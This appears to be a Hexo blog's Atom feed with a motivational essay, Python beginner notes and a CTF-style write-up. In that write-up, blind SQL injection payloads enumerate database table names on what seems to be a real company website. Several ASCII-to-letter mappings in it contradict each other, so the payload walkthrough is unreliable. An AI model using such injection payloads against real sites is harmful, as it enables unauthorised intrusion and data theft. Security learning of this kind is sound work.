<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://fengchao1847081353.github.io/"/>
  <updated>2019-04-25T15:10:31.098Z</updated>
  <id>https://fengchao1847081353.github.io/</id>
  
  <author>
    <name>Fengsir</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>致自己和还在努力的人</title>
    <link href="https://fengchao1847081353.github.io/2019/04/25/%E5%85%A5%E5%9D%91/"/>
    <id>https://fengchao1847081353.github.io/2019/04/25/入坑/</id>
    <published>2019-04-25T14:45:43.000Z</published>
    <updated>2019-04-25T15:10:31.098Z</updated>
    
    <content type="html"><![CDATA[<h3 id="曾经的我"><a href="#曾经的我" class="headerlink" title="曾经的我"></a>曾经的我</h3><p>  曾经的我和大多数一样，也为梦想奋斗过，曾经的我并不热爱信息专业，因为我是一个体育生，对运动很是痴迷，但也是机缘巧合让我入了网络安全，让我接触到原来计算机之中还有这么有趣的专业，从此入了坑，听起来很荒谬，但现实的乐趣就是随机性，从此我也就踏上了网安这条坑路。。。。</p><h3 id="未来"><a href="#未来" class="headerlink" title="未来"></a>未来</h3><p>  不知道什么时候变得异常的现实主义，对未来有着莫名的恐惧，我想所有人都是这样，以后到底会不会顺着自己的想法去发展，未来会怎么样，这些种子都埋在每个人的心中，一脸的无所谓，其实慌得一批，还是要试着走走看看，如果不适合我也不会死扛，终究有放弃的那天…</p><h3 id="忠告"><a href="#忠告" class="headerlink" title="忠告"></a>忠告</h3><p>  现在可能很累但是是暂时的，痛只有两种，长痛和短痛，不要相信鸡汤，那些和自我安慰没什么两样，什么用也没有只会越来越乱，现实就是现实不是做梦，既然年轻就去拼一把，也不会失去什么，努力和回报不成正比，请记住，996制度只是资本主义吃人的样子，不是什么努力拼搏的理由，不要为了一些没用的琐事换来一生的后悔，学习使人进步，读书不是读死书，只有学习才是是途径，要做的提升自己，而不是按照书本“照搬”，将青春奉献给自己认为不会后悔的事情，不要为了虚度而去放弃机会，珍惜你所做出的选择，不要让社会吞噬了自己。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;曾经的我&quot;&gt;&lt;a href=&quot;#曾经的我&quot; class=&quot;headerlink&quot; title=&quot;曾经的我&quot;&gt;&lt;/a&gt;曾经的我&lt;/h3&gt;&lt;p&gt;  曾经的我和大多数一样，也为梦想奋斗过，曾经的我并不热爱信息专业，因为我是一个体育生，对运动很是痴迷，但也是机缘巧合让我入
      
    
    </summary>
    
      <category term="入坑" scheme="https://fengchao1847081353.github.io/categories/%E5%85%A5%E5%9D%91/"/>
    
    
      <category term="入坑" scheme="https://fengchao1847081353.github.io/tags/%E5%85%A5%E5%9D%91/"/>
    
  </entry>
  
  <entry>
    <title>欢迎来到我的博客</title>
    <link href="https://fengchao1847081353.github.io/2019/04/25/hello-world/"/>
    <id>https://fengchao1847081353.github.io/2019/04/25/hello-world/</id>
    <published>2019-04-25T14:39:36.954Z</published>
    <updated>2019-04-09T03:00:40.718Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">网络空间安全</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网络空间安全测试</span><br></pre></td></tr></table></figure><p>More info: <a href="https://www.bilibili.com/?ADTAG=search-zd" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ 欢迎欢迎</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">测试</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ 测试</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">欢迎来到我的博客</span><br><span class="line">测试</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;网络空间安全&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hex
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>WEB实战注入</title>
    <link href="https://fengchao1847081353.github.io/2019/04/20/WEB%E8%BF%9B%E9%98%B6-%E5%AE%9E%E6%88%982%E6%B3%A8%E5%85%A5/"/>
    <id>https://fengchao1847081353.github.io/2019/04/20/WEB进阶-实战2注入/</id>
    <published>2019-04-20T14:45:43.000Z</published>
    <updated>2019-04-25T15:28:35.566Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB进阶-实战2注入"><a href="#WEB进阶-实战2注入" class="headerlink" title="WEB进阶-实战2注入"></a>WEB进阶-实战2注入</h1><p>链接：<a href="http://www.kabelindo.co.id/" target="_blank" rel="noopener">http://www.kabelindo.co.id</a> </p><p>要求是表的最后一个是flag值</p><p>就是一个网站</p><p><img src="http://img02.tooopen.com/images/20140208/sy_54953985664.jpg" alt="小黄人"></p><h5 id="对这个网站进行注入"><a href="#对这个网站进行注入" class="headerlink" title="对这个网站进行注入"></a>对这个网站进行注入</h5><h3 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h3><h4 id="1-SQLMAP直接跑"><a href="#1-SQLMAP直接跑" class="headerlink" title="1.SQLMAP直接跑"></a>1.SQLMAP直接跑</h4><p>得到flag值</p><h4 id="2-手工注入"><a href="#2-手工注入" class="headerlink" title="2.手工注入"></a>2.手工注入</h4><p>这个可以说很坑了，使用常规SQL注入爆出来表看不到最后一个。。。</p><p>上百度查询使用数字型注和盲注，直接转载大牛文章</p><p>盲注</p><p>id=24 and (select count(table_name) from information_schema.tables where table_schema=’u9897uwx_kabel’)=22%23  </p><p>发现有二十二个表  所以   需要 爆出第二十二个表</p><p>接着就按着 盲注一步一步来  （第一个字母，到最后一个字母）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">and</span> ascii(substr((select table_name from information_schema.tables where table_schema=<span class="string">'u9897uwx_kabel'</span> limit <span class="number">21</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">116</span>%<span class="number">23</span>    t</span><br><span class="line"></span><br><span class="line"> <span class="keyword">and</span> ascii(substr((select table_name from information_schema.tables where table_schema=<span class="string">'u9897uwx_kabel'</span> limit <span class="number">21</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">98</span>%<span class="number">23</span>     b</span><br><span class="line"></span><br><span class="line"> <span class="keyword">and</span> ascii(substr((select table_name from information_schema.tables where table_schema=<span class="string">'u9897uwx_kabel'</span> limit <span class="number">21</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))=<span class="number">110</span>%<span class="number">23</span>    n</span><br><span class="line"></span><br><span class="line"> <span class="keyword">and</span> ascii(substr((select table_name from information_schema.tables where table_schema=<span class="string">'u9897uwx_kabel'</span> limit <span class="number">21</span>,<span class="number">1</span>),<span class="number">4</span>,<span class="number">1</span>))=<span class="number">111</span>%<span class="number">23</span>    o</span><br><span class="line"></span><br><span class="line"> <span class="keyword">and</span> ascii(substr((select table_name from information_schema.tables where table_schema=<span class="string">'u9897uwx_kabel'</span> limit <span class="number">21</span>,<span class="number">1</span>),<span class="number">5</span>,<span class="number">1</span>))=<span class="number">116</span>%<span class="number">23</span>    m</span><br><span class="line"></span><br><span class="line"> <span class="keyword">and</span> ascii(substr((select table_name from information_schema.tables where table_schema=<span class="string">'u9897uwx_kabel'</span> limit <span class="number">21</span>,<span class="number">1</span>),<span class="number">6</span>,<span class="number">1</span>))=<span class="number">116</span>%<span class="number">23</span>    a</span><br><span class="line"></span><br><span class="line"> <span class="keyword">and</span> ascii(substr((select table_name from information_schema.tables where table_schema=<span class="string">'u9897uwx_kabel'</span> limit <span class="number">21</span>,<span class="number">1</span>),<span class="number">7</span>,<span class="number">1</span>))=<span class="number">116</span>%<span class="number">23</span>    x</span><br><span class="line"></span><br><span class="line">到了第八位发现为<span class="number">0</span>，空格    即就是只有七位，终于报完了。。。。。类似 </span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> ascii(substr((select table_name from information_schema.tables where table_schema=<span class="string">'u9897uwx_kabel'</span> limit <span class="number">21</span>,<span class="number">1</span>),<span class="number">8</span>,<span class="number">1</span>))=<span class="number">0</span>%<span class="number">23</span></span><br><span class="line"></span><br><span class="line">经过我的一步一步测试，终于爆出表明 为  tbnomax</span><br></pre></td></tr></table></figure><h5 id="最后输入-flag-tbnomax"><a href="#最后输入-flag-tbnomax" class="headerlink" title="最后输入  flag{tbnomax}"></a>最后输入  flag{tbnomax}</h5>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;WEB进阶-实战2注入&quot;&gt;&lt;a href=&quot;#WEB进阶-实战2注入&quot; class=&quot;headerlink&quot; title=&quot;WEB进阶-实战2注入&quot;&gt;&lt;/a&gt;WEB进阶-实战2注入&lt;/h1&gt;&lt;p&gt;链接：&lt;a href=&quot;http://www.kabelindo.c
      
    
    </summary>
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://fengchao1847081353.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>第2章 Python必须知道成的基础语法</title>
    <link href="https://fengchao1847081353.github.io/2019/04/20/%E7%AC%AC2%E7%AB%A0%20Python%E5%BF%85%E9%A1%BB%E7%9F%A5%E9%81%93%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
    <id>https://fengchao1847081353.github.io/2019/04/20/第2章 Python必须知道的基础语法/</id>
    <published>2019-04-20T14:45:43.000Z</published>
    <updated>2019-05-25T12:05:37.578Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第2章-Python必须知道成的基础语法"><a href="#第2章-Python必须知道成的基础语法" class="headerlink" title="第2章 Python必须知道成的基础语法"></a>第2章 Python必须知道成的基础语法</h1><h3 id="本章的知识点"><a href="#本章的知识点" class="headerlink" title="本章的知识点"></a>本章的知识点</h3><ul><li><strong>Python文件的扩展名</strong></li><li><strong>Python的编码规则</strong></li><li><strong>数据类型</strong></li><li><strong>变量和常量的定义和使用</strong></li><li><strong>运算符及表达式</strong></li></ul><h2 id="2-1-Python的文件类型"><a href="#2-1-Python的文件类型" class="headerlink" title="2.1 Python的文件类型"></a>2.1 Python的文件类型</h2><p><strong>python文件类型分为三种，分别是源代码、字节代码、优化代码。这些代码可以直接运行</strong></p><h4 id="2-1-1-源代码"><a href="#2-1-1-源代码" class="headerlink" title="2.1.1 源代码"></a>2.1.1 源代码</h4><p><strong>Python源代码的扩展名是以py结尾，可在控制台下运行。Python语言写的程序不需要编译成二进制代码，可可以直接运行源代码。pyw是windows下开发图形用户接口。以py和pyw为后缀名的文件可以使用文本工具打开，并修改文件的内容</strong></p><h4 id="2-1-2-字节代码"><a href="#2-1-2-字节代码" class="headerlink" title="2.1.2 字节代码"></a>2.1.2 字节代码</h4><p><strong>Python源文件编译后生成pyc后缀文件，pyc是编译郭的字节文件，这种文件不可以使用文本编辑工具打开或者修改。pyc文件与平台无关，因此Python的程序可以运行在Windows、UNIX、Linux等操作系统上。py文件直接运行即可获得pyc类型的文件，或通过脚本生成该类型的文件。</strong></p><p>  <strong>下面这段脚本可以把hello.py编译为hello.pyc</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> py_compile</span><br><span class="line">py_compile.compile(<span class="string">'hello.py'</span>)</span><br></pre></td></tr></table></figure><p>  <strong>保存此脚本，运行即可得到hello.pyc文件</strong></p><h4 id="2-1-3-优化代码"><a href="#2-1-3-优化代码" class="headerlink" title="2.1.3 优化代码"></a>2.1.3 优化代码</h4><p><strong>扩展名为pyo的文件是优化过的源文件，pyo类型的文件需要用命令工具生成。pyo文件也不能用文本工具编辑打开或者修改。下面把hello.py文件编译成hello.pyo</strong></p><p><strong>（1）启动命令窗口，进入hello.py文件所在的目录，例如：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /D D:\developer\python\example\02\2.1</span><br></pre></td></tr></table></figure><p><strong>(2)在命令行输入 python-O-m py_compile hello.py,并按回车键。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -O -m py_compile hello.py</span><br></pre></td></tr></table></figure><p><strong>代码说明</strong></p><ul><li><p><strong>参数“-O”表示生成优化代码</strong></p></li><li><p><strong>参数“-m”表示把导入的py_compile模块作为脚本运行。编译hello.pyo需要调用py_compile模块的compile()方法</strong></p></li><li><strong>参数“hello.py是待编译的文件名”</strong></li><li><strong>最后查看hello.py所在的文件目录，此时目录生成一个名为hello.pyo的文件</strong></li></ul><h2 id="2-2-python的编码规范"><a href="#2-2-python的编码规范" class="headerlink" title="2.2 python的编码规范"></a>2.2 python的编码规范</h2><p><strong>Python语言有一套自己独特的编码规则，包括命名规则、代码书写规则等</strong></p><h3 id="2-2-1-命名规则"><a href="#2-2-1-命名规则" class="headerlink" title="2.2.1 命名规则"></a>2.2.1 命名规则</h3><h4 id="1-变量名、包名、模块名"><a href="#1-变量名、包名、模块名" class="headerlink" title="1.变量名、包名、模块名"></a><strong>1.变量名、包名、模块名</strong></h4><p> <strong>变量名、包名、模块名通常使用小写，可使用下划线</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">01</span> <span class="comment">#变量名、模块名的命名规则</span></span><br><span class="line"><span class="number">02</span> <span class="comment">#Filename: ruleModule.py #可理解为import ruleModule.py或者 import ruleModule</span></span><br><span class="line"><span class="number">03</span></span><br><span class="line"><span class="number">04</span> _rule_ = <span class="string">"rule infomation"</span></span><br></pre></td></tr></table></figure><p><strong>代码说明</strong></p><ul><li><strong>第2行声明模块的名称，模块采用小写。也可以不指定模块名，以py后缀的文件就是一个模块。模块名就是文件名</strong></li><li><strong>第4行定义了一个全局变量_rule</strong></li></ul><h4 id="2-类名、对象名"><a href="#2-类名、对象名" class="headerlink" title="2. 类名、对象名"></a><strong>2. 类名、对象名</strong></h4><p>  <strong>1.类名首字母采用大写，对象采用小写</strong></p><p>  <strong>2.类的 ”属性“ 和 “方法名” 以 ”对象“ 作为前缀。类的私有变量</strong></p><p>  <strong>3.私有方法有一下两个下划线作为前缀。下面这段代码演示了累的定义和实例化的规范写法</strong></p><p>  <strong>4.方法名首字母小写，其后的单词首字母大写</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>:</span>          <span class="comment">#类名大写</span></span><br><span class="line">    __name = <span class="string">""</span><span class="comment">#私有变量前必须有两个下划线</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        self.__name = name<span class="comment">#self相当于java的this</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getName</span><span class="params">(self)</span>:</span><span class="comment">#方法名首字母小写，其后每个单词的首字母大写</span></span><br><span class="line">        <span class="keyword">return</span> self.__name</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">     student = Student(<span class="string">"borphi"</span>)</span><br><span class="line">     print(student.getName())</span><br></pre></td></tr></table></figure><p><strong>涉及的函数</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span><span class="class"><span class="keyword">class</span>函数   #创建类</span></span><br><span class="line">2.私有变量           #类似私有方法，在变量前加两个_,比如__fool</span><br><span class="line"><span class="number">3.</span>一、java中this关键字主要有三个应用：</span><br><span class="line"> (<span class="number">1</span>)this调用本类中的属性，也就是类中的成员变量；</span><br><span class="line"> (<span class="number">2</span>)this调用本类中的其他方法；</span><br><span class="line"> (<span class="number">3</span>)this调用本类中的其他构造方法，调用时要放在构造方法的首行。</span><br><span class="line">    this, 一个官方的说法是，this首先是一个对象,它代表调用这个函数的对象。</span><br><span class="line"><span class="number">4.</span></span><br></pre></td></tr></table></figure><p>代码说明**</p><ul><li><strong>第1行定义乐一个名为Student的类，类名首字母大写</strong></li><li><strong>第2行定义了一个私有的实例变量，变量名前有两个下划线</strong></li><li><strong>第4行代码使用self前缀说明__name变量属于Student类</strong></li><li><strong>第5行代码定义了一个公有方法，方法名首字母小写，其后的单词Name首字母大写。函数的命名规则和方法方法名相同</strong></li><li><strong>第9行代码创建了一个student对象，对象名小写</strong></li></ul><h3 id="3-函数名"><a href="#3-函数名" class="headerlink" title="3.函数名"></a>3.函数名</h3><p>   <strong>函数名通常使用小写，并采用下划线或单词首字母大写增加名名称的可读性，导入的函数以及模块名做前缀。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">randrange(start, stop[,step])</span><br></pre></td></tr></table></figure><p><strong>代码说明</strong></p><ul><li><strong>参数start表示随机所在的范围开始数字</strong></li><li><strong>参数stop表示随机数所在范围的结束数字，但不包括数字stop</strong></li><li><strong>参数step开始往后的步数。生成的随机数在[start,stop -1]的范围内，取值等于start+step</strong></li></ul><p><strong>例如</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rangrange(1, 9, 2)</span><br></pre></td></tr></table></figure><p><strong>随机数的范围在1、3、5、7之间选取。下面这段代码演示了函数的规范写法，其中定义了一个compareNum(),该函数用于比较两个数字的大小，并返回对应的结果</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#函数的命名规则</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compareNum</span><span class="params">(num1,num2)</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(num1 &gt; num2):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span>(num1 == num2):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">num1 = random.randrange(<span class="number">1</span>, <span class="number">9</span>)</span><br><span class="line">num2 = random.randrange(<span class="number">1</span>, <span class="number">9</span>)</span><br><span class="line">print( <span class="string">"num1 ="</span>,num1)</span><br><span class="line">print( <span class="string">"num2 ="</span>,num2)</span><br><span class="line">print(compareNum(num1, num2))</span><br></pre></td></tr></table></figure><p><strong>代码说明</strong></p><ul><li><strong>第2行导入了random模块</strong></li><li><strong>第4行代码定义一个函数compareNum(),参数num1,num2待作比较的两个变量</strong></li><li><strong>第5行到第10行比较两个数的大小，返回不同的结果</strong></li><li><strong>第11行、12行代码调用random（）函数返回两个随机数</strong></li><li><strong>第13、14行代码输出随机数，不同的机器，不同的执行时间得到的随机数均不相同</strong></li><li><strong>第15行代码调用compareNum，并把产生的随机数作为参数传入</strong></li><li><strong>定义函数后，最后一定输出你所定义的函数</strong></li></ul><p><strong>2.2.1.5</strong>  <strong>变量名的规范</strong></p><p>​     <strong>变量的命名应尽可能地表达此变量的作用，尽量避免缩写，以至于任何人都能理解变量名的含义。不用担心变量名的长度，长的变量名往往更清楚的表达意思</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第2章-Python必须知道成的基础语法&quot;&gt;&lt;a href=&quot;#第2章-Python必须知道成的基础语法&quot; class=&quot;headerlink&quot; title=&quot;第2章 Python必须知道成的基础语法&quot;&gt;&lt;/a&gt;第2章 Python必须知道成的基础语法&lt;/h1&gt;&lt;
      
    
    </summary>
    
      <category term="Python" scheme="https://fengchao1847081353.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://fengchao1847081353.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>第1章 进入Python的世界</title>
    <link href="https://fengchao1847081353.github.io/2019/04/20/%E7%AC%AC1%E7%AB%A0%20%E8%BF%9B%E5%85%A5Python%E7%9A%84%E4%B8%96%E7%95%8C/"/>
    <id>https://fengchao1847081353.github.io/2019/04/20/第1章 进入Python的世界/</id>
    <published>2019-04-20T14:45:43.000Z</published>
    <updated>2019-05-25T12:11:44.989Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第1章-进入Python的世界"><a href="#第1章-进入Python的世界" class="headerlink" title="第1章 进入Python的世界"></a>第1章 进入Python的世界</h1><p>Python是一种动态解释型语言的编程语言</p><h4 id="1-1-Python的由来"><a href="#1-1-Python的由来" class="headerlink" title="1.1 Python的由来"></a>1.1 Python的由来</h4><p>Python语言是由Guido van Rossum在1989年开发，在1991年正式发表.</p><h4 id="1-2-Python的特色"><a href="#1-2-Python的特色" class="headerlink" title="1.2 Python的特色"></a>1.2 Python的特色</h4><p><strong>1</strong>.<strong>面向对象特性</strong></p><p><strong>2</strong>.<strong>内置的数据结构</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">包括元组、列表、字典、集合等</span><br></pre></td></tr></table></figure><p><strong>3</strong>.<strong>简单性</strong></p><p><strong>4</strong>.<strong>健壮性</strong></p><p><strong>5</strong>.<strong>跨平台性</strong></p><p><strong>6</strong>.<strong>可扩展性</strong></p><p><strong>7.动态性</strong></p><p><strong>8.强语言性</strong></p><p><strong>9.应用广泛</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Python语言应用于数据库、网络、数学计算、WEB开发、操作系统扩展领域</span><br></pre></td></tr></table></figure><h4 id="1-3-第一个Python程序"><a href="#1-3-第一个Python程序" class="headerlink" title="1.3 第一个Python程序"></a>1.3 第一个Python程序</h4><p>​    <strong>python的源代码文件以“py”作为后缀，创建一个名为hello.py的文件，输出字符串“hello word”</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">"hello world"</span>)</span><br></pre></td></tr></table></figure><ul><li><h5 id="代码说明"><a href="#代码说明" class="headerlink" title="代码说明"></a>代码说明</h5></li></ul><p><strong>1.第一行代码相当于C语言中的main函数，是python程序的入口</strong></p><p> <strong>main函数解释</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.main函数就是第一个被调用的函数，和定义的位置、前后顺序无关</span><br><span class="line">2.在main函数之前定义一个全局变量，或者定义一个函数，都不影响main首先被执行。</span><br><span class="line">3.main()函数称之为主函数，一个C程序总是从main()函数开始执行的。</span><br></pre></td></tr></table></figure><p><strong>2.第二行代码使用了print语句输出字符串“hello world”</strong></p><p><strong>结果</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello world</span><br></pre></td></tr></table></figure><p><strong>Python的print语句用于输出字符串的内容，即把双引号的内容输出到控制台，Python的输入输出是通过“流”实现的，上述prin语句把字符串的内容输出到标准流，即输出到控制台，流也可以把结果输出到文件。</strong></p><ul><li><strong>python的运行</strong></li></ul><p>​       <strong>python  源文件+python路径</strong></p><p>​       <strong>python_file.py表示Python的源文件，python_file_path表示文件所在的路径</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python python_file_path  +  python_file.py</span><br><span class="line">python C:\user\hello.py</span><br></pre></td></tr></table></figure><h4 id="1-4-1-Python的下载与安装"><a href="#1-4-1-Python的下载与安装" class="headerlink" title="1.4.1  Python的下载与安装"></a>1.4.1  Python的下载与安装</h4><p><strong>官网</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.python.org</span><br></pre></td></tr></table></figure><p><strong>支持系统</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Windows</span><br><span class="line">Linux</span><br><span class="line">Unix</span><br><span class="line">其他系统...</span><br></pre></td></tr></table></figure><h4 id="1-5-Python的开发工具"><a href="#1-5-Python的开发工具" class="headerlink" title="1.5 Python的开发工具"></a>1.5 Python的开发工具</h4><p><strong>例如 Komodo、PythonWin、Eclipse、PyCharm,支持图形化操作具备编辑、调试等功能</strong></p><p><strong>比较好用的工具</strong></p><p><strong>PyCharm</strong></p><p><strong>Eclipse</strong></p><h4 id="1-6-运行"><a href="#1-6-运行" class="headerlink" title="1.6 运行"></a>1.6 运行</h4><p><strong>#！/bin/python</strong></p><p><strong>可以在UNIX平台下运行</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第1章-进入Python的世界&quot;&gt;&lt;a href=&quot;#第1章-进入Python的世界&quot; class=&quot;headerlink&quot; title=&quot;第1章 进入Python的世界&quot;&gt;&lt;/a&gt;第1章 进入Python的世界&lt;/h1&gt;&lt;p&gt;Python是一种动态解释型语言的编
      
    
    </summary>
    
      <category term="Python" scheme="https://fengchao1847081353.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://fengchao1847081353.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>零基础学Python</title>
    <link href="https://fengchao1847081353.github.io/2019/04/20/%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%AD%A6Python/"/>
    <id>https://fengchao1847081353.github.io/2019/04/20/零基础学Python/</id>
    <published>2019-04-20T14:45:43.000Z</published>
    <updated>2019-05-25T12:05:25.956Z</updated>
    
